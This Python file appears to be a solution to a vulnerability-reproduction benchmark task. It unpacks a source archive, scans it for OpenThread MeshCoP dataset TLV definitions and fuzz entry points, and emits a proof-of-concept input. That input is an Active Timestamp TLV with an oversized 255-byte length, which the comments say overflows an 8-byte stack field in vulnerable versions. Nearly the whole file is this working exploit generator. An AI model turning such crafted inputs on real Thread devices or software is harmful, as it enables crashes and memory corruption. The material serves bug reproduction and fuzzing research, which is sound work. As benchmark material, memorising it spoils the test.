import os
import tarfile
import re
from typing import Optional, Dict


class Solution:
    def _extract(self, src_path: str, dst: str) -> None:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(dst)
        except Exception:
            pass

    def _find_files(self, root: str, patterns) -> Dict[str, str]:
        matches = {}
        for base, _, files in os.walk(root):
            for f in files:
                path = os.path.join(base, f)
                try:
                    with open(path, "r", errors="ignore") as fh:
                        content = fh.read()
                        for p in patterns:
                            if re.search(p, content):
                                matches[path] = content
                                break
                except Exception:
                    continue
        return matches

    def _parse_type_values(self, texts: Dict[str, str]) -> Dict[str, int]:
        # Attempt to recover TLV type numbers from source
        # Defaults based on Thread MeshCoP TLVs
        type_map = {
            "ActiveTimestamp": 0x00,
            "PendingTimestamp": 0x01,
            "DelayTimer": 0x34,  # common value in MeshCoP
        }

        # Regex patterns to capture enum assignments
        pats = {
            "ActiveTimestamp": re.compile(r"k(?:Type)?ActiveTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
            "PendingTimestamp": re.compile(r"k(?:Type)?PendingTimestamp\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
            "DelayTimer": re.compile(r"k(?:Type)?DelayTimer\s*=\s*(0x[0-9a-fA-F]+|\d+)"),
        }

        for content in texts.values():
            for key, pat in pats.items():
                m = pat.search(content)
                if m:
                    try:
                        v = int(m.group(1), 0)
                        type_map[key] = v & 0xFF
                    except Exception:
                        pass
        return type_map

    def _guess_uses_dataset_from_tlvs(self, texts: Dict[str, str]) -> bool:
        # Try to see if any fuzz target consumes raw dataset TLVs
        for content in texts.values():
            if ("LLVMFuzzerTestOneInput" in content and
                ("otDatasetFromTlvs" in content or
                 "otOperationalDatasetFromTlvs" in content or
                 "OperationalDataset::SetFrom" in content or
                 "Dataset::SetFrom" in content or
                 "Dataset::IsTlvValid" in content)):
                return True
        # Also search any source mentioning Dataset::IsTlvValid (indicates raw TLV may be accepted)
        for content in texts.values():
            if "Dataset::IsTlvValid" in content:
                return True
        return False

    def _build_tlv(self, tlv_type: int, length: int, value: bytes) -> bytes:
        # MeshCoP TLVs generally use 1-byte Type and 1-byte Length
        # We clamp to 0..255 for safety
        length = max(0, min(255, length))
        if len(value) < length:
            value = value + b"\x00" * (length - len(value))
        elif len(value) > length:
            value = value[:length]
        return bytes([tlv_type & 0xFF, length]) + value

    def solve(self, src_path: str) -> bytes:
        # Strategy:
        # - Try to detect TLV type numbers from source; fall back to common defaults.
        # - Build a MeshCoP Dataset containing an Active Timestamp TLV with an oversized length (255).
        #   Vulnerable versions do not validate min required length correctly, which leads to copying
        #   'length' bytes into a fixed-size timestamp field (8 bytes), causing a stack overflow.
        # - Fixed versions reject such TLVs during validation.
        tmp_dir = os.path.join("/tmp", "src_extract_385180600")
        try:
            os.makedirs(tmp_dir, exist_ok=True)
        except Exception:
            pass

        self._extract(src_path, tmp_dir)

        patterns = [
            r"LLVMFuzzerTestOneInput",
            r"Dataset::IsTlvValid",
            r"otDatasetFromTlvs",
            r"otOperationalDatasetFromTlvs",
            r"k(?:Type)?ActiveTimestamp",
            r"k(?:Type)?PendingTimestamp",
            r"k(?:Type)?DelayTimer",
        ]
        files = self._find_files(tmp_dir, patterns)
        type_map = self._parse_type_values(files)
        _ = self._guess_uses_dataset_from_tlvs(files)  # not strictly required; kept for completeness

        # Build a PoC: One TLV with ActiveTimestamp and an oversized length of 255 bytes.
        tlv_type = type_map.get("ActiveTimestamp", 0x00)
        value = b"A" * 255
        poc = self._build_tlv(tlv_type, 255, value)

        # Keep the PoC small; adding padding could risk parsing of extra garbage TLV.
        return poc
